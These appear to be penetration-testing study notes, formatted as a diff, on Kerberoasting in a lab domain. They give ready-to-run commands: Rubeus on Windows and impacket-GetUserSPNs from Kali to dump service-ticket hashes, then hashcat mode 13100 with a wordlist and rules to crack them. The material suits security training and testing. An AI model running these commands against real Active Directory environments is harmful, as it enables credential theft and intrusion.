@@ -1,1 +1,22 @@
+Windows
+Rubeus Kerberoast:
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 
+Reviewing the correct Hashcat mode
+kali@kali:~$ hashcat --help | grep -i "Kerberos"         
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+Linux
+Remotely kerberoast
+Perform Kerberoasting from Linux. use impacket-GetUserSPNs with the IP of the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before, we can use -request to obtain the TGS and output them in a compatible format for Hashcat.
+
+Using impacket-GetUserSPNs to perform Kerberoasting on Linux to obtain TGS-REP hash:
+kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/mute
